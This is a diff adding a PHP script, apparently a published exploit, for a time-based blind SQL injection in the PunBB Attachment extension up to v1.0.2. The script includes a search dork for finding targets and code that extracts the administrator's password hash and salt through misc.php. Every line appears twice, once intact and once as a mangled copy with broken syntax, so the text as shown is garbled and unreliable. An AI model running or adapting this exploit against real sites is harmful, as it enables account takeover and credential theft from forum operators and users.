@@ -1,0 +1,126 @@
+#! / usr / bin / php 
+ &lt;?php &lt;? php 
+
+ print_r(&#039; print_r ( &#039; 
+ +---------------------------------------------------------------------------+ +------------------------------------------------- --------------------------+ 
+ Punbb Extension Attachment &lt;= v1.0.2 Bind SQL injection exploit Punbb Extension Attachment &lt;= v1.0.2 Bind SQL injection exploit 
+ by puret_t by puret_t 
+ mail: puretot at gmail dot com mail: puretot at gmail dot com 
+ team: http://www.wolvez.org team: http://www.wolvez.org 
+ dork: &quot;Powered by PunBB&quot; dork: &quot;Powered by PunBB&quot; 
+ +---------------------------------------------------------------------------+ +------------------------------------------------- --------------------------+ 
+ &#039;); &#039;); 
+ /** / ** 
+  * works regardless of php.ini settings * Works regardless of php.ini settings 
+  */ * / 
+ if ($argc &lt; 3) { if ($ argc &lt;3) ( 
+     print_r(&#039; print_r ( &#039; 
+ +---------------------------------------------------------------------------+ +------------------------------------------------- --------------------------+ 
+ Usage: php &#039;.$argv[0].&#039; host path Usage: php &#039;. $ Argv [0].&#039; Host path 
+ host:      target server (ip/hostname) host: target server (ip / hostname) 
+ path:      path to punbb path: path to punbb 
+ Example: Example: 
+ php &#039;.$argv[0].&#039; localhost /punbb/ php &#039;. $ argv [0].&#039; localhost / punbb / 
+ +---------------------------------------------------------------------------+ +------------------------------------------------- --------------------------+ 
+ &#039;); &#039;); 
+     exit; exit; 
+ } ) 
+
+ error_reporting(7); error_reporting (7); 
+ ini_set(&#039;max_execution_time&#039;, 0); ini_set ( &#039;max_execution_time&#039;, 0); 
+
+ $host = $argv[1]; $ host = $ argv [1]; 
+ $path = $argv[2]; $ path = $ argv [2]; 
+
+ $pre = &#039;pun_&#039;; $ pre = &#039;pun_&#039;; 
+
+ $benchmark = 200000000; $ benchmark = 200000000; 
+ $timeout = 10; $ timeout = 10; 
+
+ echo &quot;Plz Waiting...\nPassword:\n&quot;; echo &quot;Plz Waiting ... \ nPassword: \ n&quot;; 
+ /** / ** 
+  * get pass * Get pass 
+  */ * / 
+ $j = 1; $ j = 1; 
+ $pass = &#039;&#039;; $ pass =&#039;&#039;; 
+
+ $hash[0] = 0; //null $ hash [0] = 0; / / null 
+ $hash = array_merge($hash, range(48, 57)); //numbers $ hash = array_merge ($ hash, range (48, 57)); / / numbers 
+ $hash = array_merge($hash, range(97, 122)); //az letters $ hash = array_merge ($ hash, range (97, 122)); / / az letters 
+
+ while (strlen($pass) &lt; 40) { while (strlen ($ pass) &lt;40) ( 
+     for ($i = 0; $i &lt;= 255; $i ++) { for ($ i = 0; $ i &lt;= 255; $ i + +) ( 
+         if (in_array($i, $hash)) { if (in_array ($ i, $ hash)) ( 
+             $cmd = &#039;1f1%27%20AND%20(IF((ASCII(SUBSTRING((SELECT%20password%20FROM%20&#039;.$pre.&#039;users%20WHERE%20group_id=1%20LIMIT%201),&#039;.$j.&#039;,1))=&#039;.$i.&#039;),BENCHMARK(&#039;.$benchmark.&#039;,CHAR(0)),1))%23&#039;; $ cmd = &#039;1 f1% 27% 20AND% 20 (IF ((ASCII (SUBSTRING ((SELECT% 20password% 20FROM% 20 &#039;. $ pre.&#039; users% 20WHERE% 20group_id = 1% 20LIMIT% 201 ),&#039;.$ j . &#039;, 1 ))=&#039;.$ i.&#039;), BENCHMARK ( &#039;. $ benchmark.&#039;, CHAR (0)), 1))% 23 &#039;; 
+             send(); send (); 
+             usleep(2000000); usleep (2000000); 
+             $starttime = time(); $ starttime = time (); 
+             send(); send (); 
+             $endtime = time(); $ endtime = time (); 
+             $difftime = $endtime - $starttime; $ difftime = $ endtime - $ starttime; 
+             if ($difftime &gt; $timeout) { if ($ difftime&gt; $ timeout) ( 
+                 $pass .= chr($i); $ pass .= chr ($ i); 
+                 echo chr($i); echo chr ($ i); 
+                 break; break; 
+             } ) 
+         } ) 
+         if ($i == 255) if ($ i == 255) 
+             exit(&quot;\nExploit Failed!\n&quot;); exit ( &quot;\ nExploit Failed! \ n&quot;); 
+     } ) 
+     $j ++; $ j + +; 
+ } ) 
+
+ echo &quot;\nSalt:\n&quot;; echo &quot;\ nSalt: \ n&quot;; 
+ /** / ** 
+  * get salt * Get salt 
+  */ * / 
+ $j = 1; $ j = 1; 
+ $salt = &#039;&#039;; $ salt =&#039;&#039;; 
+
+ $hash[0] = 0; //null $ hash [0] = 0; / / null 
+ $hash = array_merge($hash, range(33, 126)); $ hash = array_merge ($ hash, range (33, 126)); 
+
+ while (strlen($salt) &lt; 12) { while (strlen ($ salt) &lt;12) ( 
+     for ($i = 0; $i &lt;= 255; $i ++) { for ($ i = 0; $ i &lt;= 255; $ i + +) ( 
+         if (in_array($i, $hash)) { if (in_array ($ i, $ hash)) ( 
+             $cmd = &#039;1f1%27%20AND%20(IF((ASCII(SUBSTRING((SELECT%20salt%20FROM%20&#039;.$pre.&#039;users%20WHERE%20group_id=1%20LIMIT%201),&#039;.$j.&#039;,1))=&#039;.$i.&#039;),BENCHMARK(&#039;.$benchmark.&#039;,CHAR(0)),1))%23&#039;; $ cmd = &#039;1 f1% 27% 20AND% 20 (IF ((ASCII (SUBSTRING ((SELECT% 20salt% 20FROM% 20 &#039;. $ pre.&#039; users% 20WHERE% 20group_id = 1% 20LIMIT% 201 ),&#039;.$ j . &#039;, 1 ))=&#039;.$ i.&#039;), BENCHMARK ( &#039;. $ benchmark.&#039;, CHAR (0)), 1))% 23 &#039;; 
+             send(); send (); 
+             usleep(2000000); usleep (2000000); 
+             $starttime = time(); $ starttime = time (); 
+             send(); send (); 
+             $endtime = time(); $ endtime = time (); 
+             $difftime = $endtime - $starttime; $ difftime = $ endtime - $ starttime; 
+             if ($difftime &gt; $timeout) { if ($ difftime&gt; $ timeout) ( 
+                 $salt .= chr($i); $ salt .= chr ($ i); 
+                 echo chr($i); echo chr ($ i); 
+                 break; break; 
+             } ) 
+         } ) 
+         if ($i == 255) if ($ i == 255) 
+             exit(&quot;\nExploit Failed!\n&quot;); exit ( &quot;\ nExploit Failed! \ n&quot;); 
+     } ) 
+     $j ++; $ j + +; 
+ } ) 
+        
+ exit(&quot;\nExpoilt Success!\nPassword Hash:\t$pass\nSalt:\t$salt\n&quot;); exit ( &quot;\ nExpoilt Success! \ nPassword Hash: \ t $ pass \ nSalt: \ t $ salt \ n&quot;); 
+
+ function send() function send () 
+ { ( 
+     global $host, $path, $cmd; global $ host, $ path, $ cmd; 
+
+     $data = &quot;GET &quot;.$path.&quot;misc.php?item=1&amp;secure_str=&quot;.$cmd.&quot;  HTTP/1.1\r\n&quot;; $ data = &quot;GET&quot;. $ path. &quot;misc.php? item = 1 &amp; secure_str =&quot;. $ cmd. &quot;HTTP/1.1 \ r \ n&quot;; 
+     $data .= &quot;Host: $host\r\n&quot;; $ data .= &quot;Host: $ host \ r \ n&quot;; 
+     $data .= &quot;Connection: Close\r\n\r\n&quot;; $ data .= &quot;Connection: Close \ r \ n \ r \ n&quot;; 
+
+     $fp = fsockopen($host, 80); $ fp = fsockopen ($ host, 80); 
+     fputs($fp, $data); fputs ($ fp, $ data); 
+
+     $resp = &#039;&#039;; $ resp =&#039;&#039;; 
+
+     while ($fp &amp;&amp; !feof($fp)) while ($ fp &amp; &amp;! feof ($ fp)) 
+         $resp .= fread($fp, 1024); $ resp .= fread ($ fp, 1024); 
+
+     return $resp; return $ resp; 
+ } ) 
+
+ ?&gt; ? &quot; 
